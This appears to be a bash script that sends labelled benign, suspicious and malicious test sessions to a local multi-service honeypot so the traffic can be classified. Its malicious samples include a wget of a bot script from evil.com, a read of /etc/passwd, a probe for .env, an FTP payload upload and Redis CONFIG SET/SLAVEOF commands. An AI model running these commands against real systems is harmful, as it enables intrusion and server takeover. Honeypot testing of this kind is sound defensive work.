#!/usr/bin/env bash
# ©AngelaMos | 2026
# generate_sessions.sh
#
# Generates ~50 sessions across all six honeypot services, spread
# across benign/suspicious/malicious intent, and writes a manifest
# (timestamp, service, label) so match_labels.py can auto-fill
# labels.csv afterward without manual CSV editing.

set -euo pipefail

HOST="${HIVE_HOST:-127.0.0.1}"
SSH_PORT="${HIVE_SSH_PORT:-1262}"
HTTP_PORT="${HIVE_HTTP_PORT:-8339}"
FTP_PORT="${HIVE_FTP_PORT:-2633}"
SMB_PORT="${HIVE_SMB_PORT:-4459}"
MYSQL_PORT="${HIVE_MYSQL_PORT:-3344}"
REDIS_PORT="${HIVE_REDIS_PORT:-6355}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MANIFEST="${SCRIPT_DIR}/manifest.csv"

echo "timestamp,service,label" > "$MANIFEST"

log() {
	local service="$1" label="$2"
	local ts
	ts="$(date -u +%Y-%m-%dT%H:%M:%S)"
	echo "${ts},${service},${label}" >> "$MANIFEST"
}

require() {
	command -v "$1" >/dev/null 2>&1 || {
		echo "Missing dependency: $1" >&2
		exit 1
	}
}

require sshpass
require curl
require python3
command -v redis-cli >/dev/null 2>&1 || echo "WARN: redis-cli not found, skipping redis sessions" >&2

# =============================================================================
# SSH
# =============================================================================

ssh_session() {
	local label="$1"; shift
	log "ssh" "$label"
	sshpass -p 'anypass' ssh \
		-o StrictHostKeyChecking=no \
		-o UserKnownHostsFile=/dev/null \
		-o ConnectTimeout=5 \
		-tt -p "$SSH_PORT" root@"$HOST" > /dev/null 2>&1 <<< "$*
exit" || true
	sleep 0.5
}

echo "== SSH (10 sessions) =="
for i in 1 2 3; do
	ssh_session benign ""
done
for i in 1 2 3 4; do
	ssh_session suspicious "id
cat /etc/passwd
uname -a"
done
for i in 1 2 3; do
	ssh_session malicious "wget http://evil.com/bot.sh
crontab -e"
done

# =============================================================================
# HTTP  (one session per request — label = single request's intent)
# =============================================================================

echo "== HTTP (9 sessions) =="
for i in 1 2 3; do
	log "http" "benign"
	curl -s -o /dev/null "http://${HOST}:${HTTP_PORT}/" || true
	sleep 0.3
done
for i in 1 2 3; do
	log "http" "suspicious"
	curl -s -o /dev/null "http://${HOST}:${HTTP_PORT}/wp-login.php" || true
	sleep 0.3
done
for i in 1 2 3; do
	log "http" "malicious"
	curl -s -o /dev/null -A "sqlmap/1.7.11" \
		"http://${HOST}:${HTTP_PORT}/.env" || true
	sleep 0.3
done

# =============================================================================
# FTP
# =============================================================================

ftp_session() {
	local label="$1" mode="$2"
	log "ftp" "$label"
	python3 - "$HOST" "$FTP_PORT" "$mode" <<'PYEOF'
import ftplib, io, sys
host, port, mode = sys.argv[1], int(sys.argv[2]), sys.argv[3]
try:
    ftp = ftplib.FTP()
    ftp.connect(host, port, timeout=5)
    ftp.login("anonymous", "anypass")
    if mode == "browse":
        ftp.pwd()
        ftp.nlst()
    elif mode == "upload":
        ftp.storbinary("STOR payload.sh", io.BytesIO(b"#!/bin/sh\necho pwned\n"))
    ftp.quit()
except Exception:
    pass
PYEOF
	sleep 0.5
}

echo "== FTP (8 sessions) =="
for i in 1 2 3; do ftp_session benign login; done
for i in 1 2 3; do ftp_session suspicious browse; done
for i in 1 2; do ftp_session malicious upload; done

# =============================================================================
# SMB
# =============================================================================

echo "== SMB (6 sessions) =="
for i in 1 2; do
	log "smb" "benign"
	python3 "${SCRIPT_DIR}/smb_probe.py" "$HOST" "$SMB_PORT" none || true
	sleep 0.3
done
for i in 1 2; do
	log "smb" "suspicious"
	python3 "${SCRIPT_DIR}/smb_probe.py" "$HOST" "$SMB_PORT" smb2 || true
	sleep 0.3
done
for i in 1 2; do
	log "smb" "malicious"
	python3 "${SCRIPT_DIR}/smb_probe.py" "$HOST" "$SMB_PORT" smb1 || true
	sleep 0.3
done

# =============================================================================
# MySQL
# =============================================================================

echo "== MySQL (8 sessions) =="
for i in 1 2 3; do
	log "mysql" "benign"
	python3 "${SCRIPT_DIR}/mysql_client.py" "$HOST" "$MYSQL_PORT" \
		"SELECT 1" || true
	sleep 0.5
done
for i in 1 2 3; do
	log "mysql" "suspicious"
	python3 "${SCRIPT_DIR}/mysql_client.py" "$HOST" "$MYSQL_PORT" \
		"SELECT DATABASE()" "SELECT USER()" "SHOW TABLES" || true
	sleep 0.5
done
for i in 1 2; do
	log "mysql" "malicious"
	python3 "${SCRIPT_DIR}/mysql_client.py" "$HOST" "$MYSQL_PORT" \
		"SHOW VARIABLES" "SELECT * FROM INFORMATION_SCHEMA.TABLES" || true
	sleep 0.5
done

# =============================================================================
# Redis
# =============================================================================

echo "== Redis (9 sessions) =="
if command -v redis-cli >/dev/null 2>&1; then
	for i in 1 2 3; do
		log "redis" "benign"
		redis-cli -h "$HOST" -p "$REDIS_PORT" PING > /dev/null 2>&1 || true
		sleep 0.3
	done
	for i in 1 2 3; do
		log "redis" "suspicious"
		redis-cli -h "$HOST" -p "$REDIS_PORT" INFO > /dev/null 2>&1 || true
		redis-cli -h "$HOST" -p "$REDIS_PORT" KEYS '*' > /dev/null 2>&1 || true
		sleep 0.3
	done
	for i in 1 2 3; do
		log "redis" "malicious"
		redis-cli -h "$HOST" -p "$REDIS_PORT" CONFIG SET dir /tmp > /dev/null 2>&1 || true
		redis-cli -h "$HOST" -p "$REDIS_PORT" SLAVEOF no one > /dev/null 2>&1 || true
		sleep 0.3
	done
fi

echo ""
echo "Done. $(($(wc -l < "$MANIFEST") - 1)) sessions generated."
echo "Manifest written to: $MANIFEST"